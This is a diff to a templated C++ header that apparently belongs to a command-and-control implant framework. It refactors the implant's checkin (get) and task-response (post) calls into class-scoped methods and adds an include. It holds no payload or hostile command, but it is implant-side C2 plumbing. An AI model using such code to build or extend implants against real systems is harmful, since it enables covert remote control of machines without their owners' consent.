@@ -8,7 +8,7 @@
 #include <optional>
 #include "modules/metadata.h"
 #include "comms/queues.h"
-
+#include "comms/comms.h"
 // ==========================================================
 // BASE INTERFACES
 // ==========================================================
@@ -72,7 +72,7 @@ protected:
 
 [%- for c2_get_profile in get_function_mappings.values() %]
 
-std::vector<uint8_t> [[ c2_get_profile.value]](std::vector<uint8_t> metadata_as_msgpack);
+std::vector<uint8_t> [[ c2_get_profile.value]]::get(std::vector<uint8_t> metadata_as_msgpack);
 
 [%- endfor %]
 
@@ -80,7 +80,7 @@ std::vector<uint8_t> [[ c2_get_profile.value]](std::vector<uint8_t> metadata_as_
 
 [%- for c2_post_profile in post_function_mappings.values() %]
 
-int [[ c2_post_profile.value]](std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
+int [[ c2_post_profile.value]]::post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
 
 [%- endfor %]
 
@@ -147,7 +147,7 @@ public:
         get_as_msgpack = this->pack_to_msgpack(get_array);
 
         //send checkin
-        std::vector<uint8_t> response = [[ c2_get_profile.value ]](get_as_msgpack);
+        std::vector<uint8_t> response = [[ c2_get_profile.value ]]::get(get_as_msgpack);
 
         nlohmann::json task_array = nlohmann::json::array();
         if (!response.empty()) {
@@ -170,7 +170,7 @@ public:
 	void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
         std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
 
-		[[ c2_post_profile.value ]](uuid, task_response_msgpack_list);
+		[[ c2_post_profile.value ]]::post(uuid, task_response_msgpack_list);
 	}
 };
 
